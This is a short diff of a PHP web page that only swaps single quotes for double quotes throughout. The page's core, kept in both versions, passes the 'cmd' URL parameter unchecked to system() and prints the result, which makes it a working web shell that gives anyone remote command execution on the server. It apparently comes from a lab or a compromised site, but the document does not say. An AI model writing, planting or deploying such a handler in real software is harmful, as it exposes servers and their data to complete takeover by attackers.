@@ -1,9 +1,9 @@
 <html>
 <?php
-include 'header.php';
+include "header.php";
 ?>   
 <div class="barre">
-    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+    <form method="GET" name="<?php echo basename($_SERVER["PHP_SELF"]); ?>">
 
     <ul class="box">
 
@@ -14,14 +14,14 @@ include 'header.php';
 </div>
 <pre>
 <?php
-    if(isset($_GET['cmd']))
+    if(isset($_GET["cmd"]))
     {
-        system($_GET['cmd']);
+        system($_GET["cmd"]);
     }
 ?>
 </pre>
 <?php
-include 'footer.html';
+include "footer.html";
 ?>
 <style>
 .box {
